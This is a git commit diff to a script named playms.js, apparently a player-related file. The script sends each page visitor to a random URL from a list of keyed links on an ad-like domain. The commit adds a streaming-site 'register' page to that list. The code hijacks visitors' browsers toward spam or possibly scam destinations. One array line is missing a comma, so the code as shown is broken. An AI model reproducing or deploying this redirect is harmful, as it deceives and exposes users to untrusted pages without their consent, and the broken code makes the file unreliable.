b6a1d64b3f8c186be0e1d321841456b95502ebd3
inisialjurawa <84512688+inisialjurawa@users.noreply.github.com>
2021-07-15 22:11:34 +0800

    Update playms.js

--- playms.js
+++ playms.js
@@ -5,7 +5,8 @@ var dataUrl = [
 '//wonderfullytumultbizarre.com/idt1y6nan?key=ce537f67a6c57e27e292db0da8179851'
 '//wonderfullytumultbizarre.com/z0sfd1pts?key=2431d39c120107799ee55bcab97fc536',
 '//wonderfullytumultbizarre.com/nuudznpz3?key=3d998b3da5397f5ac865ff0734c2be19',
-'//wonderfullytumultbizarre.com/jrzhg39q?key=c57734d92ebaa11a56b389a5ea6dd78e'
+'//wonderfullytumultbizarre.com/jrzhg39q?key=c57734d92ebaa11a56b389a5ea6dd78e',
+'//dev-filmflixss.pantheonsite.io/register'
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
 window.location = randomItem;
